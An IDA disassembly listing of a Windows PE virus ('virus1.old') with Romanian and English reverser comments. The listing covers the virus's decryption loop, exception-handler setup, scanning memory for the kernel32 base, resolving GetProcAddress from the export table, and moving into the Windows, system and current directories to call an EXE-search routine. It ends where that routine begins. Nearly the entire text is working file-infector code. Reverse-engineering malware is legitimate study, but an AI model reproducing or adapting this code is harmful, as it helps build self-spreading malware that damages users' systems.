HEADER:00400000			  ;
HEADER:00400000			  ; …ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª
HEADER:00400000			  ; ∫	  This file is generated by The	Interactive Disassembler (IDA)	      ∫
HEADER:00400000			  ; ∫	  Copyright (c)	2010 by	Hex-Rays SA, <support@hex-rays.com>	      ∫
HEADER:00400000			  ; ∫			   Licensed to:	Freeware version		      ∫
HEADER:00400000			  ; »ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº
HEADER:00400000			  ;
HEADER:00400000			  ; Input MD5	: 6616299D891786E5B19B6545047CEB98
HEADER:00400000
HEADER:00400000
HEADER:00400000					  .686p
HEADER:00400000					  .mmx
HEADER:00400000					  .model flat
HEADER:00400000
HEADER:00400000			  ; ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ
HEADER:00400000
HEADER:00400000			  ; Segment type: Pure data
HEADER:00400000			  HEADER	  segment page public 'DATA' use32
HEADER:00400000					  assume cs:HEADER
HEADER:00400000					  ;org 400000h
HEADER:00400000	4D		  __ImageBase	  db  4Dh ; M
HEADER:00400001	5A				  db  5Ah ; Z
HEADER:004002BF	00				  db	0
HEADER:004002C0	00				  db	0
HEADER:004002C1	00				  db	0
HEADER:004002C2	00				  db	0
HEADER:004002C3	00				  db	0
HEADER:004002C4	00				  db	0
HEADER:004002C5	00				  db	0
HEADER:004002C6	00				  db	0
HEADER:004002C7	00				  db	0
HEADER:004002C8	00				  db	0
HEADER:004002C9	00				  db	0
HEADER:004002CA	00				  db	0
HEADER:004002CB	00				  db	0
HEADER:004002CC	00				  db	0
HEADER:004002CD	00				  db	0
HEADER:004002CE	00				  db	0
HEADER:004002CF	00				  db	0
HEADER:004002D0	00				  db	0
HEADER:004002D1	00				  db	0
HEADER:004002D2	00				  db	0
HEADER:004002D3	00				  db	0
HEADER:004002D4	00				  db	0
HEADER:004002D5	00				  db	0
HEADER:004002D6	00				  db	0
HEADER:004002D7	00				  db	0
HEADER:004002D8	00				  db	0
HEADER:004002D9	00				  db	0
HEADER:004002DA	00				  db	0
HEADER:004002DB	00				  db	0
HEADER:004002DC	00				  db	0
HEADER:004002DD	00				  db	0
HEADER:004002DE	00				  db	0
HEADER:004002DF	00				  db	0
HEADER:004002E0	00				  db	0
HEADER:004002E1	00				  db	0
HEADER:004002E2	00				  db	0
HEADER:004002E3	00				  db	0
HEADER:004002E4	00				  db	0
HEADER:004002E5	00				  db	0
HEADER:004002E6	00				  db	0
HEADER:004002E7	00				  db	0
HEADER:004002E8	00				  db	0
HEADER:004002E9	00				  db	0
HEADER:004002EA	00				  db	0
HEADER:004002EB	00				  db	0
HEADER:004002EC	00				  db	0
HEADER:004002ED	00				  db	0
HEADER:004002EE	00				  db	0
HEADER:004002EF	00				  db	0
HEADER:004002F0	00				  db	0
HEADER:004002F1	00				  db	0
HEADER:004002F2	00				  db	0
HEADER:004002F3	00				  db	0
HEADER:004002F4	00				  db	0
HEADER:004002F5	00				  db	0
HEADER:004002F6	00				  db	0
HEADER:004002F7	00				  db	0
HEADER:004002F8	00				  db	0
HEADER:004002F9	00				  db	0
HEADER:004002FA	00				  db	0
HEADER:004002FB	00				  db	0
HEADER:004002FC	00				  db	0
HEADER:004002FD	00				  db	0
HEADER:004002FE	00				  db	0
HEADER:004002FF	00				  db	0
HEADER:00400300	00				  db	0
HEADER:00400301	00				  db	0
HEADER:00400302	00				  db	0
HEADER:00400303	00				  db	0
HEADER:00400304	00				  db	0
HEADER:00400305	00				  db	0
HEADER:00400306	00				  db	0
HEADER:00400307	00				  db	0
HEADER:00400308	00				  db	0
HEADER:00400309	00				  db	0
HEADER:0040030A	00				  db	0
HEADER:0040030B	00				  db	0
HEADER:0040030C	00				  db	0
HEADER:0040030D	00				  db	0
HEADER:0040030E	00				  db	0
HEADER:0040030F	00				  db	0
HEADER:00400310	00				  db	0
HEADER:00400311	00				  db	0
HEADER:00400312	00				  db	0
HEADER:00400313	00				  db	0
HEADER:00400314	00				  db	0
HEADER:00400315	00				  db	0
HEADER:00400316	00				  db	0
HEADER:00400317	00				  db	0
HEADER:00400318	00				  db	0
HEADER:00400319	00				  db	0
HEADER:0040031A	00				  db	0
HEADER:0040031B	00				  db	0
HEADER:0040031C	00				  db	0
HEADER:0040031D	00				  db	0
HEADER:0040031E	00				  db	0
HEADER:0040031F	00				  db	0
HEADER:00400320	00				  db	0
HEADER:00400321	00				  db	0
HEADER:00400322	00				  db	0
HEADER:00400323	00				  db	0
HEADER:00400324	00				  db	0
HEADER:00400325	00				  db	0
HEADER:00400326	00				  db	0
HEADER:00400327	00				  db	0
HEADER:00400328	00				  db	0
HEADER:00400329	00				  db	0
HEADER:0040032A	00				  db	0
HEADER:0040032B	00				  db	0
HEADER:0040032C	00				  db	0
HEADER:0040032D	00				  db	0
HEADER:0040032E	00				  db	0
HEADER:0040032F	00				  db	0
HEADER:00400330	00				  db	0
HEADER:00400331	00				  db	0
HEADER:00400332	00				  db	0
HEADER:00400333	00				  db	0
HEADER:00400334	00				  db	0
HEADER:00400335	00				  db	0
HEADER:00400336	00				  db	0
HEADER:00400337	00				  db	0
HEADER:00400338	00				  db	0
HEADER:00400339	00				  db	0
HEADER:0040033A	00				  db	0
HEADER:0040033B	00				  db	0
HEADER:0040033C	00				  db	0
HEADER:0040033D	00				  db	0
HEADER:0040033E	00				  db	0
HEADER:0040033F	00				  db	0
HEADER:00400340	00				  db	0
HEADER:00400341	00				  db	0
HEADER:00400342	00				  db	0
HEADER:00400343	00				  db	0
HEADER:00400344	00				  db	0
HEADER:00400345	00				  db	0
HEADER:00400346	00				  db	0
HEADER:00400347	00				  db	0
HEADER:00400348	00				  db	0
HEADER:00400349	00				  db	0
HEADER:0040034A	00				  db	0
HEADER:0040034B	00				  db	0
HEADER:0040034C	00				  db	0
HEADER:0040034D	00				  db	0
HEADER:0040034E	00				  db	0
HEADER:0040034F	00				  db	0
HEADER:00400350	00				  db	0
HEADER:00400351	00				  db	0
HEADER:00400352	00				  db	0
HEADER:00400353	00				  db	0
HEADER:00400354	00				  db	0
HEADER:00400355	00				  db	0
HEADER:00400356	00				  db	0
HEADER:00400357	00				  db	0
HEADER:00400358	00				  db	0
HEADER:00400359	00				  db	0
HEADER:0040035A	00				  db	0
HEADER:0040035B	00				  db	0
HEADER:0040035C	00				  db	0
HEADER:0040035D	00				  db	0
HEADER:0040035E	00				  db	0
HEADER:0040035F	00				  db	0
HEADER:00400360	00				  db	0
HEADER:00400361	00				  db	0
HEADER:00400362	00				  db	0
HEADER:00400363	00				  db	0
HEADER:00400364	00				  db	0
HEADER:00400365	00				  db	0
HEADER:00400366	00				  db	0
HEADER:00400367	00				  db	0
HEADER:00400368	00				  db	0
HEADER:00400369	00				  db	0
HEADER:0040036A	00				  db	0
HEADER:0040036B	00				  db	0
HEADER:0040036C	00				  db	0
HEADER:0040036D	00				  db	0
HEADER:0040036E	00				  db	0
HEADER:0040036F	00				  db	0
HEADER:00400370	00				  db	0
HEADER:00400371	00				  db	0
HEADER:00400372	00				  db	0
HEADER:00400373	00				  db	0
HEADER:00400374	00				  db	0
HEADER:00400375	00				  db	0
HEADER:00400376	00				  db	0
HEADER:00400377	00				  db	0
HEADER:00400378	00				  db	0
HEADER:00400379	00				  db	0
HEADER:0040037A	00				  db	0
HEADER:0040037B	00				  db	0
HEADER:0040037C	00				  db	0
HEADER:0040037D	00				  db	0
HEADER:0040037E	00				  db	0
HEADER:0040037F	00				  db	0
HEADER:00400380	00				  db	0
HEADER:00400381	00				  db	0
HEADER:00400382	00				  db	0
HEADER:00400383	00				  db	0
HEADER:00400384	00				  db	0
HEADER:00400385	00				  db	0
HEADER:00400386	00				  db	0
HEADER:00400387	00				  db	0
HEADER:00400388	00				  db	0
HEADER:00400389	00				  db	0
HEADER:0040038A	00				  db	0
HEADER:0040038B	00				  db	0
HEADER:0040038C	00				  db	0
HEADER:0040038D	00				  db	0
HEADER:0040038E	00				  db	0
HEADER:0040038F	00				  db	0
HEADER:00400390	00				  db	0
HEADER:00400391	00				  db	0
HEADER:00400392	00				  db	0
HEADER:00400393	00				  db	0
HEADER:00400394	00				  db	0
HEADER:00400395	00				  db	0
HEADER:00400396	00				  db	0
HEADER:00400397	00				  db	0
HEADER:00400398	00				  db	0
HEADER:00400399	00				  db	0
HEADER:0040039A	00				  db	0
HEADER:0040039B	00				  db	0
HEADER:0040039C	00				  db	0
HEADER:0040039D	00				  db	0
HEADER:0040039E	00				  db	0
HEADER:0040039F	00				  db	0
HEADER:004003A0	00				  db	0
HEADER:004003A1	00				  db	0
HEADER:004003A2	00				  db	0
HEADER:004003A3	00				  db	0
HEADER:004003A4	00				  db	0
HEADER:004003A5	00				  db	0
HEADER:004003A6	00				  db	0
HEADER:004003A7	00				  db	0
HEADER:004003A8	00				  db	0
HEADER:004003A9	00				  db	0
HEADER:004003AA	00				  db	0
HEADER:004003AB	00				  db	0
HEADER:004003AC	00				  db	0
HEADER:004003AD	00				  db	0
HEADER:004003AE	00				  db	0
HEADER:004003AF	00				  db	0
HEADER:004003B0	00				  db	0
HEADER:004003B1	00				  db	0
HEADER:004003B2	00				  db	0
HEADER:004003B3	00				  db	0
HEADER:004003B4	00				  db	0
HEADER:004003B5	00				  db	0
HEADER:004003B6	00				  db	0
HEADER:004003B7	00				  db	0
HEADER:004003B8	00				  db	0
HEADER:004003B9	00				  db	0
HEADER:004003BA	00				  db	0
HEADER:004003BB	00				  db	0
HEADER:004003BC	00				  db	0
HEADER:004003BD	00				  db	0
HEADER:004003BE	00				  db	0
HEADER:004003BF	00				  db	0
HEADER:004003C0	00				  db	0
HEADER:004003C1	00				  db	0
HEADER:004003C2	00				  db	0
HEADER:004003C3	00				  db	0
HEADER:004003C4	00				  db	0
HEADER:004003C5	00				  db	0
HEADER:004003C6	00				  db	0
HEADER:004003C7	00				  db	0
HEADER:004003C8	00				  db	0
HEADER:004003C9	00				  db	0
HEADER:004003CA	00				  db	0
HEADER:004003CB	00				  db	0
HEADER:004003CC	00				  db	0
HEADER:004003CD	00				  db	0
HEADER:004003CE	00				  db	0
HEADER:004003CF	00				  db	0
HEADER:004003D0	00				  db	0
HEADER:004003D1	00				  db	0
HEADER:004003D2	00				  db	0
HEADER:004003D3	00				  db	0
HEADER:004003D4	00				  db	0
HEADER:004003D5	00				  db	0
HEADER:004003D6	00				  db	0
HEADER:004003D7	00				  db	0
HEADER:004003D8	00				  db	0
HEADER:004003D9	00				  db	0
HEADER:004003DA	00				  db	0
HEADER:004003DB	00				  db	0
HEADER:004003DC	00				  db	0
HEADER:004003DD	00				  db	0
HEADER:004003DE	00				  db	0
HEADER:004003DF	00				  db	0
HEADER:004003E0	00				  db	0
HEADER:004003E1	00				  db	0
HEADER:004003E2	00				  db	0
HEADER:004003E3	00				  db	0
HEADER:004003E4	00				  db	0
HEADER:004003E5	00				  db	0
HEADER:004003E6	00				  db	0
HEADER:004003E7	00				  db	0
HEADER:004003E8	00				  db	0
HEADER:004003E9	00				  db	0
HEADER:004003EA	00				  db	0
HEADER:004003EB	00				  db	0
HEADER:004003EC	00				  db	0
HEADER:004003ED	00				  db	0
HEADER:004003EE	00				  db	0
HEADER:004003EF	00				  db	0
HEADER:004003F0	00				  db	0
HEADER:004003F1	00				  db	0
HEADER:004003F2	00				  db	0
HEADER:004003F3	00				  db	0
HEADER:004003F4	00				  db	0
HEADER:004003F5	00				  db	0
HEADER:004003F6	00				  db	0
HEADER:004003F7	00				  db	0
HEADER:004003F8	00				  db	0
HEADER:004003F9	00				  db	0
HEADER:004003FA	00				  db	0
HEADER:004003FB	00				  db	0
HEADER:004003FC	00				  db	0
HEADER:004003FD	00				  db	0
HEADER:004003FE	00				  db	0
HEADER:004003FF	00				  db	0
HEADER:00400400	?? ?? ?? ?? ?? ??+		  align	1000h
HEADER:00400400	?? ?? ?? ?? ?? ??+HEADER	  ends
HEADER:00400400	?? ?? ?? ?? ?? ??+
CODE:00401000			; File Name   :	D:\reverse\virus1.old
CODE:00401000			; Format      :	Portable executable for	80386 (PE)
CODE:00401000			; Imagebase   :	400000
CODE:00401000			; Section 1. (virtual address 00001000)
CODE:00401000			; Virtual size			: 00001000 (   4096.)
CODE:00401000			; Section size in file		: 00000200 (	512.)
CODE:00401000			; Offset to raw	data for section: 00000600
CODE:00401000			; Flags	60000020: Text Executable Readable
CODE:00401000			; Alignment	: default
CODE:00401000			;
CODE:00401000			; The code at 400000..401000 is	hidden from normal disassembly
CODE:00401000			; and was loaded because the user ordered to load it explicitly
CODE:00401000			;
CODE:00401000			;  <<<<	IT MAY CONTAIN TROJAN HORSES, VIRUSES, AND DO HARMFUL THINGS >>>
CODE:00401000			;
CODE:00401000			;
CODE:00401000			; ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ
CODE:00401000
CODE:00401000			; Segment type:	Pure code
CODE:00401000			; Segment permissions: Read/Execute
CODE:00401000			CODE		segment	para public 'CODE' use32
CODE:00401000					assume cs:CODE
CODE:00401000					;org 401000h
CODE:00401000					assume es:nothing, ss:nothing, ds:CODE,	fs:nothing, gs:nothing
CODE:00401000
CODE:00401000			; €€€€€€€€€€€€€€€ S U B	R O U T	I N E €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
CODE:00401000
CODE:00401000
CODE:00401000					public start
CODE:00401000			start		proc near
CODE:00401000
CODE:00401000			; FUNCTION CHUNK AT DATA:00402037 SIZE 00000122	BYTES
CODE:00401000
CODE:00401000 60				pusha			; Push all registers to	stack
CODE:00401001 9C				pushf			; Push EFLAGS to stack,	first 16 bits
CODE:00401002 33 ED				xor	ebp, ebp	; EBP =	0. Stack initialized.
CODE:00401004 E9 2E 10 00 00			jmp	Inceput_cod	; Now jump to the real deal.
CODE:00401004			start		endp
CODE:00401004
CODE:00401009
CODE:00401009			; €€€€€€€€€€€€€€€ S U B	R O U T	I N E €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
CODE:00401009
CODE:00401009
CODE:00401009			proc_exit	proc near		; DATA XREF: DATA:offset_proc_exito
CODE:00401009 6A 00				push	0		; uExitCode
CODE:0040100B E8 06 00 00 00			call	ExitProcess
CODE:00401010 FF 25 4C 40 40 00			jmp	ds:MessageBoxA
CODE:00401010			proc_exit	endp
CODE:00401010
CODE:00401016
CODE:00401016			; €€€€€€€€€€€€€€€ S U B	R O U T	I N E €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
CODE:00401016
CODE:00401016			; Attributes: thunk
CODE:00401016
CODE:00401016			; void __stdcall ExitProcess(UINT uExitCode)
CODE:00401016			ExitProcess	proc near		; CODE XREF: proc_exit+2p
CODE:00401016 FF 25 54 40 40 00			jmp	ds:__imp_ExitProcess
CODE:00401016			ExitProcess	endp
CODE:00401016
CODE:00401016			; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
CODE:0040101C 00 00 00 00 00 00+		dd 79h dup(0)
CODE:00401200 ?? ?? ?? ?? ?? ??+		dd 380h	dup(?)
CODE:00401200 ?? ?? ?? ?? ?? ??+CODE		ends
CODE:00401200 ?? ?? ?? ?? ?? ??+
DATA:00402000			; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
DATA:00402000			; Section 2. (virtual address 00002000)
DATA:00402000			; Virtual size			: 00002000 (   8192.)
DATA:00402000			; Section size in file		: 00000800 (   2048.)
DATA:00402000			; Offset to raw	data for section: 00000800
DATA:00402000			; Flags	C0000040: Data Readable	Writable
DATA:00402000			; Alignment	: default
DATA:00402000			; ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ
DATA:00402000
DATA:00402000			; Segment type:	Pure data
DATA:00402000			; Segment permissions: Read/Write
DATA:00402000			DATA		segment	para public 'DATA' use32
DATA:00402000					assume cs:DATA
DATA:00402000					;org 402000h
DATA:00402000
DATA:00402000			Save_state:				; DATA XREF: Search_EXE+174o
DATA:00402000								; Search_EXE+201r
DATA:00402000 60				pusha
DATA:00402001 9C				pushf
DATA:00402002
DATA:00402002			Stack_alignment:			; DATA XREF: Search_EXE+179w
DATA:00402002 BD 00 00 00 00			mov	ebp, 0
DATA:00402007 8D B5 37 20 40 00			lea	esi, Inceput_cod[ebp]
DATA:0040200D 8B FE				mov	edi, esi
DATA:0040200F B9 BC 00 00 00			mov	ecx, 0BCh
DATA:00402014
DATA:00402014			Nullify_EBX:				; DATA XREF: Search_EXE+1FBw
DATA:00402014 BB 00 00 00 00			mov	ebx, 0
DATA:00402019
DATA:00402019			Encryption:				; CODE XREF: DATA:0040202Ej
DATA:00402019								; DATA:00402035j
DATA:00402019 AD				lodsd
DATA:0040201A 92				xchg	eax, edx
DATA:0040201B AD				lodsd
DATA:0040201C 3B D3				cmp	edx, ebx
DATA:0040201E 77 12				ja	short Condition_Not_Met
DATA:00402020 53				push	ebx
DATA:00402021 52				push	edx
DATA:00402022 F7 E3				mul	ebx
DATA:00402024 5B				pop	ebx
DATA:00402025 03 C3				add	eax, ebx
DATA:00402027 83 D2 00				adc	edx, 0
DATA:0040202A 5B				pop	ebx
DATA:0040202B AB				stosd
DATA:0040202C 92				xchg	eax, edx
DATA:0040202D AB				stosd
DATA:0040202E E2 E9				loop	Encryption
DATA:00402030 EB 05				jmp	short Inceput_cod
DATA:00402032			; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
DATA:00402032
DATA:00402032			Condition_Not_Met:			; CODE XREF: DATA:0040201Ej
DATA:00402032 AB				stosd
DATA:00402033 92				xchg	eax, edx
DATA:00402034 AB				stosd
DATA:00402035 E2 E2				loop	Encryption
DATA:00402037			; START	OF FUNCTION CHUNK FOR start
DATA:00402037
DATA:00402037			Inceput_cod:				; CODE XREF: start+4j
DATA:00402037								; DATA:00402030j
DATA:00402037								; DATA XREF: ...
DATA:00402037 8B 85 E5 25 40 00			mov	eax, ss:offset_proc_exit[ebp]
DATA:0040203D 89 85 5A 21 40 00			mov	dword ptr ss:(Return+1)[ebp], eax
DATA:00402043 68 5F 21 40 00			push	offset Exception_Handling
DATA:00402048 64 67 FF 36 00 00			push	dword ptr fs:0	; fs:0 = Structured Exception Handling(SEH)
DATA:0040204E 64 67 89 26 00 00			mov	fs:0, esp	; 44 = 4 * (pusha + pushf + loc_40215F + fs:0)
DATA:0040204E								; EAX is in KERNEL.32 space
DATA:0040204E								; Pointer to next SEH record
DATA:00402054 8B 44 24 2C			mov	eax, [esp+2Ch]
DATA:00402058
DATA:00402058			bucla_cautare_mzpe:			; CODE XREF: start+106Dj
DATA:00402058 66 81 38 4D 5A			cmp	word ptr [eax],	'ZM'
DATA:0040205D 75 0D				jnz	short decrementare_index_bucla
DATA:0040205F 8B 58 3C				mov	ebx, [eax+IMAGE_DOS_HEADER.e_lfanew]
DATA:00402062 03 D8				add	ebx, eax
DATA:00402064 81 3B 50 45 00 00			cmp	dword ptr [ebx], 'EP'
DATA:0040206A 74 03				jz	short mzpe_gasit
DATA:0040206C
DATA:0040206C			decrementare_index_bucla:		; CODE XREF: start+105Dj
DATA:0040206C 48				dec	eax
DATA:0040206D EB E9				jmp	short bucla_cautare_mzpe
DATA:0040206F			; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
DATA:0040206F
DATA:0040206F			mzpe_gasit:				; CODE XREF: start+106Aj
DATA:0040206F 89 85 36 32 40 00			mov	[ebp+4207158], eax
DATA:00402075 8B 5B 78				mov	ebx, [ebx+IMAGE_NT_HEADERS.OptionalHeader.DataDirectory.VirtualAddress]
DATA:00402078 03 D8				add	ebx, eax
DATA:0040207A 8B 53 20				mov	edx, [ebx+IMAGE_EXPORT_DIRECTORY.AddressOfNames]
DATA:0040207D 03 D0				add	edx, eax
DATA:0040207F 8B 4B 18				mov	ecx, [ebx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]
DATA:00402082
DATA:00402082			GetProcAddress_SEARCH:			; CODE XREF: start+109Cj
DATA:00402082 51				push	ecx
DATA:00402083 8B 32				mov	esi, [edx]	; Functia la adresa EDX
DATA:00402085 03 F0				add	esi, eax
DATA:00402087 8D BD EA 24 40 00			lea	edi, aGetprocaddress[ebp] ; "GetProcAddress"
DATA:0040208D B9 0F 00 00 00			mov	ecx, 0Fh	; Lungimea la "GetProcAddress" este 14,	a fost ales 15
DATA:00402092 FC				cld
DATA:00402093 F3 A6				repe cmpsb		; Compara numele functiei date cu "GetProcAddress"
DATA:00402095 59				pop	ecx
DATA:00402096 74 0B				jz	short Setari_Directory
DATA:00402098 42				inc	edx
DATA:00402099 42				inc	edx
DATA:0040209A 42				inc	edx
DATA:0040209B 42				inc	edx		; Trece	la urmatoarea functie
DATA:0040209C E2 E4				loop	GetProcAddress_SEARCH ;	Are ECX	incercari pentru a gasi	functia
DATA:0040209E E9 AD 00 00 00			jmp	Stack_Optimisation
DATA:004020A3			; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
DATA:004020A3
DATA:004020A3			Setari_Directory:			; CODE XREF: start+1096j
DATA:004020A3 8B 53 18				mov	edx, [ebx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]
DATA:004020A6 2B D1				sub	edx, ecx
DATA:004020A8 D1 E2				shl	edx, 1		; word
DATA:004020AA 03 53 24				add	edx, [ebx+IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
DATA:004020AD 03 D0				add	edx, eax
DATA:004020AF 33 C9				xor	ecx, ecx	; ecx<-0
DATA:004020B1 66 8B 0A				mov	cx, [edx]
DATA:004020B4 C1 E1 02				shl	ecx, 2		; dword
DATA:004020B7 03 4B 1C				add	ecx, [ebx+IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
DATA:004020BA 03 C8				add	ecx, eax
DATA:004020BC 8B 19				mov	ebx, [ecx]
DATA:004020BE 03 D8				add	ebx, eax
DATA:004020C0 89 9D 3A 32 40 00			mov	ss:GetProcAddress[ebp],	ebx
DATA:004020C6 8D 85 32 31 40 00			lea	eax, GetCurrentDirectory_Addr[ebp]
DATA:004020CC 50				push	eax
DATA:004020CD 68 04 01 00 00			push	MAX_PATH	; 260 =	MAX size
DATA:004020D2 8D 85 9A 25 40 00			lea	eax, aGetcurrentdirectorya[ebp]	; "GetCurrentDirectoryA"
DATA:004020D8 E8 C9 03 00 00			call	CallByName
DATA:004020DD 68 04 01 00 00			push	MAX_PATH
DATA:004020E2 8D 85 2E 30 40 00			lea	eax, Path_buffer[ebp]
DATA:004020E8 50				push	eax
DATA:004020E9 8D 85 AF 25 40 00			lea	eax, aGetwindowsdirectorya[ebp]	; "GetWindowsDirectoryA"
DATA:004020EF E8 B2 03 00 00			call	CallByName
DATA:004020F4 8D 85 2E 30 40 00			lea	eax, Path_buffer[ebp]
DATA:004020FA 50				push	eax
DATA:004020FB 8D 85 85 25 40 00			lea	eax, aSetcurrentdirectorya[ebp]	; "SetCurrentDirectoryA"
DATA:00402101 E8 A0 03 00 00			call	CallByName
DATA:00402106 E8 5A 00 00 00			call	Search_EXE
DATA:0040210B 68 04 01 00 00			push	MAX_PATH
DATA:00402110 8D 85 2E 30 40 00			lea	eax, Path_buffer[ebp]
DATA:00402116 50				push	eax
DATA:00402117 8D 85 C4 25 40 00			lea	eax, aGetsystemdirectorya[ebp] ; "GetSystemDirectoryA"
DATA:0040211D E8 84 03 00 00			call	CallByName
DATA:00402122 8D 85 2E 30 40 00			lea	eax, Path_buffer[ebp]
DATA:00402128 50				push	eax
DATA:00402129 8D 85 85 25 40 00			lea	eax, aSetcurrentdirectorya[ebp]	; "SetCurrentDirectoryA"
DATA:0040212F E8 72 03 00 00			call	CallByName
DATA:00402134 E8 2C 00 00 00			call	Search_EXE
DATA:00402139 8D 85 32 31 40 00			lea	eax, GetCurrentDirectory_Addr[ebp]
DATA:0040213F 50				push	eax
DATA:00402140 8D 85 85 25 40 00			lea	eax, aSetcurrentdirectorya[ebp]	; "SetCurrentDirectoryA"
DATA:00402146 E8 5B 03 00 00			call	CallByName
DATA:0040214B E8 15 00 00 00			call	Search_EXE
DATA:00402150
DATA:00402150			Stack_Optimisation:			; CODE XREF: start+109Ej
DATA:00402150								; DATA:00402163j
DATA:00402150 64 67 8F 06 00 00			pop	dword ptr fs:0
DATA:00402156 58				pop	eax
DATA:00402157 9D				popf
DATA:00402158 61				popa
DATA:00402158			; END OF FUNCTION CHUNK	FOR start
DATA:00402159
DATA:00402159			Return:					; DATA XREF: start+103Dw
DATA:00402159 68 00 00 00 00			push	0		; Parametrul lui push a	fost patchuit
DATA:00402159								; cu adresa procedurii de iesire
DATA:0040215E C3				retn
DATA:0040215F			; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
DATA:0040215F
DATA:0040215F			Exception_Handling:			; DATA XREF: start+1043o
DATA:0040215F 8B 64 24 08			mov	esp, [esp+8]
DATA:00402163 EB EB				jmp	short Stack_Optimisation
DATA:00402165
DATA:00402165			; €€€€€€€€€€€€€€€ S U B	R O U T	I N E €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
DATA:00402165
DATA:00402165
DATA:00402165			Search_EXE	proc near		; CODE XREF: start+1106p
DATA:00402165								; start+1134p ...
